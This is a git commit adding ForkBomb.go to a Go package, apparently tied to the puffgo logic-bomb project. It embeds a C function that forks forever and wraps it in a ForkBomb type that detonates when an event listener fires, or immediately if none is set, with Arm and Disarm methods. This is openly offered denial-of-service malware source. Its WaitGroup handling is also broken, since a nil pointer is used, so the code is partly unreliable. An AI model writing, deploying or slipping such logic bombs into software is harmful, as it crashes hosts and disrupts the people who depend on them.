9b7307777cb7bcbe997f07544023662dff9ea4b1
NovusEdge <novusedge0@gmail.com>
2021-11-13 13:13:03 +0530

    Added the type: ForkBomb for the package

---
+++ ForkBomb.go
@@ -0,0 +1,71 @@
+package fbomb
+
+import (
+	"sync"
+
+	puffgo "github.com/ARaChn3/puffgo"
+)
+
+/*
+#include<unistd.h>
+
+int fb() {
+	while(1){ fork(); }
+}
+*/
+import "C"
+
+type ForkBomb struct {
+
+	// Listener specifies the EventListener for the bomb.
+	// If Listener is nil, the ForkBomb will go off as soon
+	// as the program/binary is executed.
+	//
+	// To create an event-listener, use the NewListener function
+	// present in the puffgo project.
+	// For more details, visit the puffgo wiki.
+	Listener *puffgo.EventListener
+}
+
+func NewBomb(listener *puffgo.EventListener) *ForkBomb {
+	fb := ForkBomb{}
+	if listener == nil {
+		el := puffgo.NewListener(nil, func() bool { return true })
+		fb.Listener = el
+	} else {
+		fb.Listener = listener
+	}
+
+	return &fb
+}
+
+// Arm() allows the activation of the bomb. If a bomb is not armed,
+// it won't be triggered even if the event defined in Listener occurs.
+func (fb *ForkBomb) Arm() {
+	var wg *sync.WaitGroup
+
+	go func() {
+		defer wg.Done()
+		fb.Listener.Mainloop()
+	}()
+
+	go func() {
+		defer wg.Done()
+		for {
+			if isTriggered := <-fb.Listener.TriggerChannel; isTriggered {
+				fb.Listener.Terminate()
+				C.fb()
+				break
+			}
+		}
+	}()
+	wg.Add(2)
+	wg.Wait()
+}
+
+// Disarm() allows the deactivation of the bomb. It passes a true into
+// the TerminationChannel of Listener, thereby terminating the listener's
+// mainloop.
+func (fb *ForkBomb) Disarm() {
+	fb.Listener.Terminate()
+}
